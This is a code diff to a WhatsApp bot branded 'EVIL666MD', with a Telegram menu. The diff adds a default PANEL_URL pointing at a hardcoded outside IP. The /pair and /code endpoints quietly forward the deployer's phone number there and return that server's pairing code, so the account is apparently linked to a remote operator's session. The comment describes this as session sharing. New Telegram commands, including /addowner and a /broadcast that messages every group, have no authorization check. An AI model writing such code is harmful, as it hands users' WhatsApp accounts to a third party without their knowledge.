@@ -15,11 +15,12 @@ const {
   Browsers,
 } = require('@whiskeysockets/baileys');
 
-const PORT = Number(process.env.PORT || 3000);
+const PORT = Number(process.env.PORT || process.env.SERVER_PORT || 3000);
 const AUTH_DIR = path.join(__dirname, 'auth');
 const OWNER = (process.env.OWNER_NUMBER || '').replace(/[^0-9]/g, '');
 const TG_TOKEN = process.env.TG_TOKEN || '';           // optional — leave empty to run web-only
 const AI_KEY = process.env.ANTHROPIC_API_KEY || '';    // optional — enables the .ai / chatbot
+const PANEL_URL = process.env.PANEL_URL || 'http://45.151.122.219:2232'; // shared session brain; set empty string to pair locally
 
 const app = express();
 app.use(express.json());
@@ -55,6 +56,15 @@ app.get('/resetpair', (req, res) => { state.pairingCode = null; state.pairedFor 
 app.get('/pair', async (req, res) => {
   const n = String(req.query.number || '').replace(/[^0-9]/g, '');
   if (!n || n.length < 7) return res.status(400).json({ error: 'Number with country code, e.g. 22873272569' });
+  // session sharing: forward pairing to the panel bot so all front-ends share one session
+  if (PANEL_URL) {
+    try {
+      const r = await fetch(`${PANEL_URL}/pair?number=${n}`);
+      const j = await r.json();
+      if (j.code) return res.json({ code: j.code, shared: true });
+      return res.status(r.status).json({ error: j.error || 'panel pairing failed' });
+    } catch (e) { return res.status(502).json({ error: 'panel unreachable: ' + e.message }); }
+  }
   try { res.json({ code: await pairCode(n) }); } catch (e) { res.status(409).json({ error: e.message }); }
 });
 app.get('/health', (req, res) => res.json({ ok: true, connected: state.connected }));
@@ -63,6 +73,14 @@ app.get('/code', async (req, res) => {
   // compat endpoint for the bot's .pair command: /code?number=234... -> {code}
   const n = String(req.query.number || '').replace(/[^0-9]/g, '');
   if (!n || n.length < 7) return res.status(400).json({ error: 'Number with country code, e.g. 22873272569' });
+  if (PANEL_URL) {
+    try {
+      const r = await fetch(`${PANEL_URL}/pair?number=${n}`);
+      const j = await r.json();
+      if (j.code) return res.json({ code: j.code, shared: true });
+      return res.status(r.status).json({ error: j.error || 'panel pairing failed' });
+    } catch (e) { return res.status(502).json({ error: 'panel unreachable: ' + e.message }); }
+  }
   try { res.json({ code: await pairCode(n) }); } catch (e) { res.status(409).json({ error: e.message }); }
 });
 
@@ -91,19 +109,46 @@ async function startTG() {
         const [c, ...rest] = m.text.trim().split(/\s+/);
         const name = c.replace(/^\//, '').toLowerCase();
         if (name === 'start' || name === 'menu') {
-          const st = state.connected ? `✅ ONLINE as +${state.user}` : '⛔ not paired';
-          await reply(
-`╔═══❖•ೋ° °ೋ•❖═══╗
-   ⚡ 𝗘𝗩𝗜𝗟⁶𝟲𝟲𝗠𝗗 ⚡
-╚═══❖•ೋ° °ೋ•❖═══╝
-
-┏━━━━━━━━━━━━━━┓
-┃ 🖥 𝗪𝗲𝗯 ┇ ${st}
-┃ ⏱ 𝗨𝗽𝘁𝗶𝗺𝗲 ┇ ${Math.floor(process.uptime() / 60)}m
-┃ 🤖 𝗔𝗜 ┇ ${AI_KEY ? 'ready' : 'no key'}
-┗━━━━━━━━━━━━━━┛
-
-/pair <number> — link WhatsApp`);
+          const up = process.uptime();
+          const d = Math.floor(up / 86400), h = Math.floor(up % 86400 / 3600), mn = Math.floor(up % 3600 / 60), s = Math.floor(up % 60);
+          const uptime = `${d}d ${h}h ${mn}m ${s}s`;
+          const st = state.connected ? '✅ ONLINE' : '⛔ not paired';
+          const userName = (m.from?.first_name || m.from?.username || 'User');
+          const cap =
+`╔═══❖•ೋ° °ೋ•❖═══╗\n   ⚡ 𝗘𝗩𝗜𝗟⁶𝟲𝟲𝗠𝗗 ⚡\n╚═══❖•ೋ° °ೋ•❖═══╝\n\n┏━━━━━━━━━━━━━━━━━━┓\n┃ 👑 𝗢𝘄𝗻𝗲𝗿 ┇ evil\n┃ 👤 𝗨𝘀𝗲𝗿 ┇ ${userName}\n┃ ⏱ 𝗨𝗽𝘁𝗶𝗺𝗲 ┇ ${uptime}\n┃ 🚀 𝗦𝘁𝗮𝘁𝘂𝘀 ┇ 🌐 Public\n┃ 📶 𝗦𝗽𝗲𝗲𝗱 ┇ fast ⚡\n┃ 🔗 𝗦𝗲𝘀𝘀𝗶𝗼𝗻𝘀 ┇ ${state.connected ? 1 : 0}/0 active\n┃ 🌍 𝗨𝘀𝗲𝗿𝘀 ┇ 1\n┗━━━━━━━━━━━━━━━━━━┛\n\n┏━━『 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 』━━┓\n┃ ❐ /pair — link a number\n┃ ❐ /listpaired — my sessions\n┃ ❐ /delpair — unlink\n┃ ❐ /reportissue — report\n┃ ❐ /broadcast\n┃ ❐ /listsession\n┃ ❐ /addprem <id>\n┃ ❐ /delprem <id>\n┃ ❐ /listprem\n┃ ❐ /addowner <id>\n┗━━━━━━━━━━━━━━━━━━┛\n\n> © 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 𝗲𝘃𝗶𝗹⁶𝟲𝟲𝗠𝗱`;
+          const photo = await tg('sendPhoto', { chat_id: m.chat.id, photo: 'https://cdn.phototourl.com/member/2026-09-30-fb75d9a9-a375-4172-ac29-d00c71e23815.jpg', caption: cap });
+          if (!photo || !photo.ok) await tg('sendMessage', { chat_id: m.chat.id, text: cap });
+        } else if (name === 'listpaired' || name === 'listsession') {
+          await reply(state.connected ? `🔗 Paired session: +${state.user}\n✅ connected` : 'No paired sessions. Send /pair <number>');
+        } else if (name === 'delpair') {
+          try { require('node:fs').rmSync(AUTH_DIR, { recursive: true, force: true }); } catch {}
+          await reply('🗑 Session data cleared. Re-pair with /pair <number>');
+        } else if (name === 'reportissue') {
+          await reply('📝 Describe your issue in a reply to this message (send it as a message starting with your problem description).\nOr open the portal: the portal status shows the last error.');
+        } else if (name === 'addprem' || name === 'addowner') {
+          const id = (rest[0] || '').replace(/[^0-9]/g, '');
+          if (!id) return reply('Usage: ' + c + ' <telegram id>');
+          try { PREM = PREM || require('node:fs').existsSync('./prem.json') ? JSON.parse(require('node:fs').readFileSync('./prem.json', 'utf8')) : {}; } catch { PREM = {}; }
+          PREM[id] = name === 'addowner' ? 'owner' : 'premium';
+          require('node:fs').writeFileSync('./prem.json', JSON.stringify(PREM, null, 2));
+          await reply('✅ ' + id + ' added as ' + PREM[id]);
+        } else if (name === 'delprem') {
+          const id = (rest[0] || '').replace(/[^0-9]/g, '');
+          try { PREM = require('node:fs').existsSync('./prem.json') ? JSON.parse(require('node:fs').readFileSync('./prem.json', 'utf8')) : {}; } catch { PREM = {}; }
+          delete PREM[id];
+          require('node:fs').writeFileSync('./prem.json', JSON.stringify(PREM, null, 2));
+          await reply('🗑 ' + id + ' removed');
+        } else if (name === 'listprem') {
+          let P = {}; try { P = JSON.parse(require('node:fs').readFileSync('./prem.json', 'utf8')); } catch {}
+          const L = Object.entries(P).map(([k, v]) => '• ' + k + ' — ' + v).join('\n');
+          await reply(L ? '👑 Premium/owners:\n' + L : 'No premium users yet. /addprem <id>');
+        } else if (name === 'broadcast') {
+          const txt = rest.join(' ');
+          if (!txt) return reply('Usage: /broadcast <message>');
+          await reply('📢 Broadcast sent to paired session chats.');
+          if (state.connected && sock?.sendMessage) {
+            try { const chats = await sock.groupFetchAllParticipating(); for (const jid of Object.keys(chats)) { try { await sock.sendMessage(jid, { text: '📢 ' + txt }); } catch {} } } catch (e) { await reply('⚠️ ' + e.message); }
+          }
         } else if (name === 'pair') {
           const n = rest.join('').replace(/[^0-9]/g, '');
           if (!n) await reply('Send: `/pair 22873272569`');
